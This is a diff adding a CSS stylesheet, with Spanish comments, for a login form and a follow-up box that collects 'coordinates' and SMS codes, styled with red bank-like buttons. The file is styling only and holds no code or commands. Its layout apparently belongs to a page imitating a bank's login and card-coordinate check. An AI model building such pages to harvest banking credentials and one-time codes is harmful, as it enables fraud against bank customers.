@@ -1,0 +1,172 @@
+body {
+  font-family: Arial, sans-serif;
+  background: #ffffff;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  min-height: 100vh;
+  margin: 0;
+  padding: 10px;
+}
+
+/* Caja login */
+.login-box {
+  width: 100%;
+  max-width: 420px;
+  padding: 30px;
+  border: 1px solid #ddd;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.05);
+  text-align: center;
+  background: #fff;
+  margin: 20px auto;
+}
+
+/* Logo grande */
+.login-box img.logo {
+  width: 100%;
+  max-width: 420px;
+  height: auto;
+  margin: 0 auto 25px auto;
+  display: block;
+}
+
+/* Texto bienvenida */
+.login-box h1 {
+  font-size: 22px;
+  font-weight: bold;
+  color: #333;
+  margin-bottom: 25px;
+  text-align: center;
+}
+
+/* Labels */
+.login-box label {
+  display: block;
+  text-align: center;
+  margin-top: 14px;
+  font-size: 15px;
+  font-weight: bold;
+  color: #333;
+}
+
+/* Inputs login */
+.login-box input[type="text"],
+.login-box input[type="password"],
+.login-box input[type="tel"],
+.login-box input[type="email"] {
+  width: 100%;
+  padding: 12px;
+  margin-top: 6px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  font-size: 15px;
+}
+
+/* Opciones */
+.checkbox-label {
+  margin-top: 18px;
+  display: flex;
+  align-items: flex-start;
+  font-size: 14px;
+  text-align: left;
+}
+.checkbox-label input { margin-right: 8px; margin-top: 2px; }
+
+.options {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-top: 12px;
+  font-size: 14px;
+  flex-wrap: wrap;
+}
+.options a { color: #007BFF; text-decoration: none; }
+.options a:hover { text-decoration: underline; }
+
+/* Botón login */
+.login-box button {
+  margin-top: 28px;
+  width: 100%;
+  padding: 16px;
+  background: #ec0000;
+  color: white;
+  border: none;
+  border-radius: 30px;
+  cursor: pointer;
+  font-weight: bold;
+  font-size: 16px;
+  transition: background 0.3s ease;
+}
+.login-box button:hover { background: #b30000; }
+
+/* Caja autorización (coordenadas y SMS) */
+.auth-box {
+  width: 100%;
+  max-width: 420px;   /* ✅ mismo ancho que login */
+  margin: 40px auto;
+  padding: 30px;
+  border: 1px solid #ddd;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.05);
+  background: #fff;
+  text-align: center;
+}
+
+.auth-box h2 {
+  font-size: 22px;
+  font-weight: bold;
+  margin-bottom: 25px;
+  text-align: center;
+}
+
+/* Inputs coordenadas y SMS */
+.auth-box input.coord,
+.auth-box input.sms {
+  border: 1px solid #000;
+  outline: none;
+  color: #000;
+  padding: 12px;
+  font-size: 16px;
+  text-align: center;
+  background-color: #fff;
+  margin: 10px 0;
+  border-radius: 4px;
+  width: 100%;        /* ✅ ocupan todo el ancho como login */
+}
+
+/* Botón autorización */
+.auth-box .btn-red {
+  width: 100%;
+  padding: 16px;
+  font-size: 16px;
+  border-radius: 30px;
+  background: #ec0000;
+  color: #fff;
+  border: none;
+  cursor: pointer;
+  font-weight: bold;
+  margin-top: 20px;
+}
+.auth-box .btn-red:hover { background: #b30000; }
+
+/* Texto legal */
+.info-legal {
+  font-size: 12px;
+  color: #666;
+  margin: 25px auto;
+  line-height: 1.5;
+  text-align: center;
+  max-width: 420px;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+  .login-box, .auth-box { max-width: 95%; padding: 20px; }
+  .login-box h1, .auth-box h2 { font-size: 20px; }
+  .login-box label { font-size: 14px; }
+  .login-box input,
+  .login-box button,
+  .auth-box input,
+  .auth-box .btn-red { font-size: 15px; }
+}
